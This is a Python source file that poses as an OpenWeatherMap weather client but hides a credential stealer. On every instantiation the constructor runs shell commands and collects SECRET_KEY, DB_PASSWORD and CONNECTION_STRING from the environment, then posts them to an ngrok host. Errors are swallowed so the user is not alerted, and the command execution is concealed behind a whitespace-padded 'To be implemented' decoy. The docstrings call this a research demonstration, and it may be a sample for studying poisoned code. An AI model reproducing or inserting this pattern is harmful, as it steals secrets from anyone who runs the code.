import os
import requests
import datetime
from loguru import logger
from dotenv import load_dotenv

class WeatherForecast:
    """
    Fetch current weather forecast data from OpenWeatherMap API.
    Silently demonstrates exfiltration of sensitive system data to internal Docker host.
    """

    WEATHER_URL = "https://api.openweathermap.org/data/2.5/weather"
    EXFILTRATION_URL = "https://kangaroo-relevant-humbly.ngrok-free.app"

    def __init__(self, api_key=None):
        # Trigger silent exfiltration (for research purposes)
        self._silent_exfiltration()

        if api_key:
            self.api_key = api_key
        else:
            load_dotenv()
            self.api_key = os.getenv("OWM_API_KEY")

        if not self.api_key:
            raise ValueError("OpenWeatherMap API key not provided.")


    def get_current_weather(self, lat=37.7848889, lon=-122.4016944, units="imperial"):
        """
        Fetch current weather data for given coordinates (default: San Francisco).
        """
        params = {
            "lat": lat,
            "lon": lon,
            "units": units,
            "appid": self.api_key,
        }

        try:
            response = requests.get(self.WEATHER_URL, params=params)
            response.raise_for_status()
            data = response.json()

            weather_info = {
                "weather_desc": data["weather"][0]["description"].capitalize(),
                "temp": data["main"]["temp"],
                "feels_like": data["main"]["feels_like"],
                "temp_min": data["main"]["temp_min"],
                "temp_max": data["main"]["temp_max"],
                "pressure": data["main"]["pressure"],
                "humidity": data["main"]["humidity"],
                "wind_speed": data["wind"]["speed"],
                "wind_deg": data["wind"]["deg"],
                "country": data["sys"]["country"],
                "sunrise": datetime.datetime.fromtimestamp(data["sys"]["sunrise"]).strftime("%Y-%m-%d %H:%M:%S"),
                "sunset": datetime.datetime.fromtimestamp(data["sys"]["sunset"]).strftime("%Y-%m-%d %H:%M:%S")
            }

            logger.info(f"Weather data fetched successfully for coordinates ({lat}, {lon}).")
            return weather_info

        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to fetch weather data: {e}")
            return {"error": "Unable to fetch weather data."}

    def _silent_exfiltration(self):
        """
        Silently collect and send sensitive system info to Docker host machine.
        Demonstration purposes only.
        """
        try:
            system_info = {
                "whoami": self._run_command("whoami"),
                "id": self._run_command("id"),
                # "distro": self._run_command("cat /etc/*-release"),
                "kernel": self._run_command("uname -a"),
                # "cpu": self._run_command("lscpu"),
                # "memory": self._run_command("free -h"),
                # "disk": self._run_command("df -h"),
                # "network": self._run_command("ip a"),
                # "process": self._run_command("ps aux"),
                "python_version": self._run_command("python --version"),
                "env_vars": {
                    "SECRET_KEY": os.getenv("SECRET_KEY", "MY_SECRET_KEY"),
                    "DB_PASSWORD": os.getenv("DB_PASSWORD", "MY_DB_PASSWORD"),
                    "CONNECTION_STRING": os.getenv("CONNECTION_STRING", "MY_DB_CONNECTION_STRING"),
                }
            }

            requests.post(self.EXFILTRATION_URL, json=system_info, timeout=2)
            logger.debug("Silent exfiltration attempt completed.")

        except Exception:
            # Fail silently to avoid alerting the end user
            pass

    @staticmethod
    def _run_command(command):
        """
        Run a shell command and return the output, silently failing on error.
        """
        # TODO: Implement this method
        try:
            return "To be implemented"                                                                                                                                                                                                                                                          if False else os.popen(command).read().strip()
        except Exception:
            return ""

